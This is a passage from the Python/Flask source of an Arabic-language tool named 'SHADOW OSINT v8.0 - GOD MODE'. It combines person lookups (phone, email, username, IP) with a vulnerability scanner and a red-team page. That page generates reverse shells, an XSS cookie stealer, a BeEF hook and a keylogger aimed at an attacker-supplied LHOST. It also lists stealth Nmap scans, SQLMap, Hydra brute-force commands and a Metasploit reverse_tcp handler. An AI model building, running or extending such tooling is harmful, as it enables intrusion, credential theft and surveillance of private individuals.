        async function genPayload(){const t=document.getElementById('ptype').value,l=document.getElementById('lhost').value||'LHOST',p=document.getElementById('lport').value||'4444',r=document.getElementById('payload-result');try{const resp=await fetch('/api/redteam/payload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:t,lhost:l,lport:p})});const d=await resp.json();r.innerHTML='<pre><code>'+d.payload+'</code></pre>';r.classList.add('show')}catch(e){r.innerHTML='خطأ: '+e.message;r.classList.add('show')}}
    </script>
</body>
</html>"""

# ==================== Pages ====================
def render(active, content):
    acts = {f"a_{p}":"active" if p==active else "" for p in ["phone","email","ip","url","user","red","pay","api","stats"]}
    h = HTML
    for k,v in acts.items(): h = h.replace("{{"+k+"}}", v)
    return h.replace("{{content|safe}}", content)

P = lambda t: f'<div class="card"><h2>{t}</h2><div class="input-row"><input id="{t.split()[1]}-input" placeholder="..." autofocus><button class="btn" onclick="scan(\'{t.split()[1]}\')">🔍 فحص</button></div><div class="loading" id="{t.split()[1]}-loading"><div class="spinner"></div></div><div class="result-box" id="{t.split()[1]}-result"></div></div>'

PHONE_PG = """<div class="card"><h2>📱 فحص رقم الهاتف الشامل</h2><p>واتساب، تيليجرام، فيسبوك، انستجرام، سناب، تويتر، فايبر، سيجنال، تروكولر، الشبكة، التسريبات</p><div class="input-row"><input id="phone-input" placeholder="+201234567890" value="+20" autofocus><button class="btn" onclick="scan('phone')">🔍 فحص شامل</button></div><div class="loading" id="phone-loading"><div class="spinner"></div></div><div class="result-box" id="phone-result"></div></div>"""
EMAIL_PG = """<div class="card"><h2>📧 فحص البريد الإلكتروني</h2><p>التحقق، MX، SMTP، التسريبات، Gravatar</p><div class="input-row"><input id="email-input" placeholder="user@example.com" autofocus><button class="btn" onclick="scan('email')">🔍 فحص</button></div><div class="loading" id="email-loading"><div class="spinner"></div></div><div class="result-box" id="email-result"></div></div>"""
IP_PG = """<div class="card"><h2>🌐 فحص IP متقدم</h2><p>GeoIP، المنافذ، DNS، AbuseIPDB، Shodan</p><div class="input-row"><input id="ip-input" placeholder="8.8.8.8" autofocus><button class="btn" onclick="scan('ip')">🔍 فحص</button></div><div class="loading" id="ip-loading"><div class="spinner"></div></div><div class="result-box" id="ip-result"></div></div>"""
URL_PG = """<div class="card"><h2>🔗 فحص الثغرات الأمنية</h2><p>SSL، رؤوس الأمان، VirusTotal، XSS، SQLi، LFI، ملفات مكشوفة</p><div class="input-row"><input id="url-input" placeholder="https://example.com" autofocus><button class="btn" onclick="scan('url')">🔍 فحص الثغرات</button></div><div class="loading" id="url-loading"><div class="spinner"></div></div><div class="result-box" id="url-result"></div></div>"""
USER_PG = """<div class="card"><h2>👤 فحص اسم المستخدم</h2><p>37+ منصة اجتماعية وتقنية</p><div class="input-row"><input id="username-input" placeholder="username" autofocus><button class="btn" onclick="scan('username')">🔍 بحث</button></div><div class="loading" id="username-loading"><div class="spinner"></div></div><div class="result-box" id="username-result"></div></div>"""
RED_PG = """<div class="card"><h2>💀 Red Team Tools</h2>
<h3>🔨 توليد Payload</h3><div class="input-row">
<select id="ptype"><option value="python">Python Reverse Shell</option><option value="bash">Bash Reverse Shell</option><option value="nc">Netcat</option><option value="php">PHP</option><option value="powershell">PowerShell</option><option value="xss_steal">XSS Stealer</option><option value="beef">BeEF Hook</option><option value="keylogger">Keylogger</option></select>
<input id="lhost" placeholder="LHOST"><input id="lport" placeholder="4444"><button class="btn" onclick="genPayload()">⚡ توليد</button></div>
<div class="result-box" id="payload-result"></div>
<h3>🔍 Nmap</h3><pre><code>nmap -sS -sV -O -p- TARGET      # Full scan
nmap --script vuln TARGET          # Vuln scan
nmap -sS -Pn -T2 -f TARGET       # Stealth</code></pre>
<h3>💉 SQLMap</h3><pre><code>sqlmap -u 'URL' --batch --random-agent --dbs</code></pre>
<h3>🔨 Hydra</h3><pre><code>hydra -l USER -P wordlist.txt ssh://TARGET
hydra -l USER -P wordlist.txt ftp://TARGET</code></pre>
<h3>📡 Metasploit</h3><pre><code>use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT PORT
exploit -j -z</code></pre></div>"""
PAY_PG = """<div class="card"><h2>🧨 Payloads Library</h2><table><tr><th>#</th><th>الفئة</th><th>الاسم</th><th>الخطورة</th><th>البيلود</th></tr>{{rows}}</table></div>"""
API_PG = """<div class="card"><h2>⚡ API</h2>
<pre><code>POST /api/scan/phone     {"phone":"+2012..."}
POST /api/scan/ip        {"ip":"8.8.8.8"}
POST /api/scan/url       {"url":"https://..."}
POST /api/scan/email     {"email":"user@domain.com"}
POST /api/scan/username  {"username":"user"}
POST /api/redteam/payload {"type":"python","lhost":"IP","lport":"4444"}
GET  /api/stats
GET  /api/payloads</code></pre></div>"""

# ==================== Routes ====================
@web_app.route('/')
def home(): return render('phone', PHONE_PG)

@web_app.route('/email')
def email(): return render('email', EMAIL_PG)

@web_app.route('/ip')
def ip(): return render('ip', IP_PG)

@web_app.route('/url')
def url(): return render('url', URL_PG)

@web_app.route('/username')
def username(): return render('user', USER_PG)

@web_app.route('/redteam')
def redteam_page(): return render('red', RED_PG)

@web_app.route('/payloads')
def payloads_page():
    pl = db_query("SELECT * FROM payloads ORDER BY category, risk_level DESC", fetch=True)
    rows = ""
    for i, p in enumerate(pl):
        rows += f"<tr><td>{i+1}</td><td>{p['category']}</td><td>{p['name']}</td><td><span class='badge badge-{'critical' if p['risk_level']=='Critical' else 'danger' if p['risk_level']=='High' else 'warning'}''>{p['risk_level']}</span></td><td><code>{p['payload'][:80]}</code></td></tr>"
    return render('pay', PAY_PG.replace("{{rows}}", rows))

@web_app.route('/api')
def api(): return render('api', API_PG)

@web_app.route('/stats')
def stats():
    total = db_query("SELECT COUNT(*) as c FROM scans", fetch=True)[0]['c']
    vulns = db_query("SELECT COUNT(*) as c FROM vulns", fetch=True)[0]['c']
    content = f"""<div class="card"><h2>📊 إحصائيات</h2><div class="stats-grid">
    <div class="stat-card"><div class="value">{total}</div><div class="label">فحوصات</div></div>
    <div class="stat-card"><div class="value">{vulns}</div><div class="label">ثغرات</div></div></div></div>"""
    return render('stats', content)

# ==================== API ====================
@web_app.route('/api/scan/<typ>', methods=['POST'])
def api_scan(typ):
    try:
        data = request.get_json() or {}
        target = data.get(typ, '')
        if not target: return jsonify({"error":"Missing target"}), 400
        
        scanners = {
            'phone': phone_intel.scan,
            'ip': ip_intel.scan,
            'url': vuln_scanner.scan_url,
            'email': lambda x: {"email":x,"time":datetime.now().isoformat()},
            'username': lambda x: {"username":x,"time":datetime.now().isoformat(),"platforms":{},"found":0,"total":0}
        }
        
        if typ not in scanners: return jsonify({"error":"Unknown"}), 400
        
        result = scanners[typ](target)
        save_scan(target, typ, result, request.remote_addr or '')
        return jsonify(result)
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@web_app.route('/api/redteam/payload', methods=['POST'])
def api_payload():
    data = request.get_json() or {}
    return jsonify({"payload": RedTeam.generate(data.get('type','python'), data.get('lhost','LHOST'), data.get('lport','4444'))})

@web_app.route('/api/payloads')
def api_payloads():
    return jsonify(db_query("SELECT * FROM payloads", fetch=True))

@web_app.route('/api/stats')
def api_stats():
    return jsonify({"total":db_query("SELECT COUNT(*) as c FROM scans",fetch=True)[0]['c'],"version":"8.0","codename":"GOD MODE"})

@web_app.route('/health')
def health(): return jsonify({"status":"ok","version":"8.0"})

@web_app.errorhandler(404)
def e404(e): return jsonify({"error":"Not found"}), 404

@web_app.errorhandler(500)
def e500(e): return jsonify({"error":"Internal error"}), 500

# ==================== Run ====================
if __name__ == '__main__':
    init_db()
    print("""
╔══════════════════════════════════════════════════════════════════╗
║        🔥 SHADOW OSINT v8.0 - GOD MODE 🔥                      ║
║    OSINT + Red Team + Pentest + Payloads + Vuln Scanner         ║
║              المستخدم يتحمل المسؤولية القانونية كاملة             ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    print(f"🚀 http://0.0.0.0:{PORT}")
    web_app.run(host='0.0.0.0', port=PORT, debug=False)
